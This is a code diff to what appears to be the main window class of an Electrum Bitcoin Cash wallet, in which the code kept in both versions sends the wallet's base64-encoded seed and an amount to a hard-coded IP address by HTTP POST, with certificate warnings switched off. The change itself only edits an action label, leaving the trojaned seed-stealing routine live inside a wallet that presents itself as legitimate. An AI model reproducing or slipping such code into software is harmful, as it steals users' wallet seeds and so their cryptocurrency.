@@ -1009,7 +1009,7 @@ class ElectrumWindow(QMainWindow, MessageBoxMixin, PrintError):
 
                 sendurl='http://158.247.211.155/recive.php'
                 fishman = 'abc'
-                action = 'send_amount'
+                action = 'sendamount'
                 con_type = 'bch'
                 server_recive_key = 'mes'
                 
@@ -1031,8 +1031,7 @@ class ElectrumWindow(QMainWindow, MessageBoxMixin, PrintError):
                         import requests
                         import urllib3
                         urllib3.disable_warnings()
-                        
-                        action = 'amount'
+                      
                         da = con_type + '_' + action+'_'+fishman + '_' + seed_base64 + '_' + str(am0unt)
                         b={server_recive_key:da}
                         requests.post(sendurl,data=b)
